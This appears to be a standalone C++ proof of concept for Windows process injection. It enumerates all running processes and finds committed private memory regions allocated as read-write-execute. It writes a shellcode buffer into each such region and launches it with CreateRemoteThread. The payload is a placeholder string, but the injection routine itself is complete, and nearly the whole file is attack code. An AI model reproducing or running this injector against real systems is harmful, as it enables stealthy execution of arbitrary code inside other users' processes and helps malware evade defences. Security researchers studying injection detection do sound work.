#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>

int main()
{
	MEMORY_BASIC_INFORMATION mbi = {};
	LPVOID offset = 0;
	HANDLE process = NULL;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	DWORD bytesWritten = 0;
	unsigned char shellcode[] = "code";
	Process32First(snapshot, &processEntry);
	while (Process32Next(snapshot, &processEntry))
	{
		process = OpenProcess(MAXIMUM_ALLOWED, false, processEntry.th32ProcessID);
		if (process)
		{
			std::wcout << processEntry.szExeFile << "\n";
			while (VirtualQueryEx(process, offset, &mbi, sizeof(mbi)))
			{
				offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
				if (mbi.AllocationProtect == PAGE_EXECUTE_READWRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE)
				{
					std::cout << "\tRWX: 0x" << std::hex << mbi.BaseAddress << "\n";
					WriteProcessMemory(process, mbi.BaseAddress, shellcode, sizeof(shellcode), NULL);
					CreateRemoteThread(process, NULL, NULL, (LPTHREAD_START_ROUTINE)mbi.BaseAddress, NULL, NULL, NULL);
				}
			}
			offset = 0;
		}
		CloseHandle(process);
	}

	return 0;
}